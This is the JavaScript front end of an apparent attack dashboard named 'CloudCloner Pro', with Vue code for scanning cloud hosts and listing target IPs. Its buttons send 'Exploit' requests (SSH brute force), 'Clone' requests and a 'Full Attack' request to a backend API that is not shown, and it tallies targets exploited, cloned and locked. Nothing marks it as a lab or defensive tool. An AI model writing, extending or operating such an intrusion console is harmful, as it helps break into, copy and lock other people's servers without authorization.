// === index.html dan ajratildi (XOLERIC SEO) ===
// Vue Dashboard
        new Vue({
            el: '#app',
            data: {
                targets: [],
                stats: { total_targets: 0, exploited: 0, cloned: 0, locked: 0 },
                logs: [],
                scanRunning: false,
                selectedTarget: null,
                status: 'idle'
            },
            mounted() {
                this.loadTargets();
                this.loadStats();
                this.connectSocket();
                setInterval(() => { this.loadStats(); }, 5000);
            },
            methods: {
                async loadTargets() {
                    const res = await axios.get('/api/targets');
                    this.targets = res.data;
                },
                async loadStats() {
                    const res = await axios.get('/api/stats');
                    this.stats = res.data;
                },
                async startScan() {
                    this.scanRunning = true;
                    this.addLog('info', 'Starting cloud scan...');
                    const res = await axios.post('/api/scan', { type: 'all' });
                    this.addLog('info', `Scan task: ${res.data.task_id}`);
                    // Poll for status
                    const interval = setInterval(async () => {
                        const status = await axios.get(`/api/scan/status/${res.data.task_id}`);
                        if (status.data.status === 'completed') {
                            clearInterval(interval);
                            this.scanRunning = false;
                            this.addLog('success', `Scan complete. Found ${status.data.result.total} nodes.`);
                            this.loadTargets();
                            this.loadStats();
                        }
                    }, 2000);
                },
                async exploitTarget(ip) {
                    this.addLog('info', `Exploiting ${ip}...`);
                    const res = await axios.post('/api/exploit', { ip: ip, type: 'ssh_bruteforce' });
                    this.addLog('info', `Exploit task: ${res.data.task_id}`);
                },
                async cloneTarget(ip) {
                    this.addLog('info', `Cloning ${ip}...`);
                    const res = await axios.post('/api/clone', { ip: ip });
                    this.addLog('info', `Clone task: ${res.data.task_id}`);
                },
                async fullAttack(ip) {
                    this.addLog('warn', `FULL ATTACK on ${ip} initiated`);
                    const res = await axios.post('/api/attack/full', { ip: ip });
                    this.addLog('info', `Attack task: ${res.data.task_id}`);
                },
                addLog(type, msg) {
                    const time = new Date().toLocaleTimeString();
                    this.logs.push({ time, type, msg });
                    this.$nextTick(() => {
                        const el = this.$el.querySelector('.terminal');
                        if (el) el.scrollTop = el.scrollHeight;
                    });
                },
                connectSocket() {
                    const socket = io();
                    socket.on('connect', () => {
                        this.addLog('info', 'WebSocket connected');
                    });
                    socket.on('attack_started', (data) => {
                        this.addLog('warn', `Attack started on ${data.target}`);
                    });
                }
            },
            template: `
                <div class="container mx-auto p-4">
                    <div class="flex justify-between items-center border-b border-green-500 pb-4 mb-6">
                        <h1 class="text-3xl font-bold glow">☁️ CloudCloner Pro</h1>
                        <div class="flex items-center">
                            <span class="status-dot" :class="status === 'idle' ? 'inactive' : 'active'"></span>
                            <span class="ml-2 text-sm">{{ status.toUpperCase() }}</span>
                        </div>
                    </div>

                    <div class="grid grid-cols-4 gap-4 mb-6">
                        <div class="bg-black border border-green-500 p-4 rounded">
                            <div class="text-3xl font-bold">{{ stats.total_targets }}</div>
                            <div class="text-sm text-gray-500">TARGETS</div>
                        </div>
                        <div class="bg-black border border-green-500 p-4 rounded">
                            <div class="text-3xl font-bold text-yellow-500">{{ stats.exploited }}</div>
                            <div class="text-sm text-gray-500">EXPLOITED</div>
                        </div>
                        <div class="bg-black border border-green-500 p-4 rounded">
                            <div class="text-3xl font-bold text-blue-500">{{ stats.cloned }}</div>
                            <div class="text-sm text-gray-500">CLONED</div>
                        </div>
                        <div class="bg-black border border-green-500 p-4 rounded">
                            <div class="text-3xl font-bold text-red-500">{{ stats.locked }}</div>
                            <div class="text-sm text-gray-500">LOCKED</div>
                        </div>
                    </div>

                    <div class="flex gap-2 mb-6 flex-wrap">
                        <button @click="startScan" class="bg-green-500 text-black px-6 py-2 rounded font-bold hover:bg-green-400 transition" :disabled="scanRunning">
                            {{ scanRunning ? 'SCANNING...' : '🔍 SCAN' }}
                        </button>
                        <button @click="loadTargets" class="border border-green-500 text-green-500 px-6 py-2 rounded hover:bg-green-500 hover:text-black transition">
                            📡 REFRESH
                        </button>
                    </div>

                    <div class="grid grid-cols-2 gap-6">
                        <div>
                            <h2 class="text-lg font-bold mb-2">🎯 TARGETS</h2>
                            <div class="bg-black border border-green-500 rounded p-4 h-96 overflow-y-auto">
                                <div v-for="t in targets" :key="t.ip" class="border-b border-gray-800 py-2 hover:bg-gray-900 cursor-pointer" @click="selectedTarget = t">
                                    <div class="flex justify-between">
                                        <span class="text-green-500 font-bold">{{ t.ip }}</span>
                                        <span class="text-xs px-2 py-1 rounded" :class="{'bg-green-900 text-green-400': t.status === 'exploited', 'bg-blue-900 text-blue-400': t.status === 'cloned', 'bg-yellow-900 text-yellow-400': t.status === 'discovered'}">
                                            {{ t.status }}
                                        </span>
                                    </div>
                                    <div class="text-xs text-gray-500">{{ t.provider || 'unknown' }} • {{ t.hostname || '' }}</div>
                                    <div class="flex gap-2 mt-2">
                                        <button @click.stop="exploitTarget(t.ip)" class="text-xs border border-green-500 px-2 py-1 rounded hover:bg-green-500 hover:text-black">💀 Exploit</button>
                                        <button @click.stop="cloneTarget(t.ip)" class="text-xs border border-blue-500 px-2 py-1 rounded hover:bg-blue-500 hover:text-black">🧬 Clone</button>
                                        <button @click.stop="fullAttack(t.ip)" class="text-xs border border-red-500 px-2 py-1 rounded hover:bg-red-500 hover:text-black">⚡ Full</button>
                                    </div>
                                </div>
                                <div v-if="targets.length === 0" class="text-gray-500 text-center py-10">No targets found. Run a scan.</div>
                            </div>
                        </div>
                        <div>
                            <h2 class="text-lg font-bold mb-2">📋 LOGS</h2>
                            <div class="terminal" ref="logContainer">
                                <div v-for="log in logs" :key="log.time" class="text-sm">
                                    <span class="text-gray-500">[{{ log.time }}]</span>
                                    <span :class="{'text-green-400': log.type === 'success', 'text-yellow-400': log.type === 'warn', 'text-red-400': log.type === 'error', 'text-blue-400': log.type === 'info'}">
                                        {{ log.msg }}
                                    </span>
                                </div>
                                <div v-if="logs.length === 0" class="text-gray-500">Waiting for logs...</div>
                            </div>
                        </div>
                    </div>
                </div>
            `
        });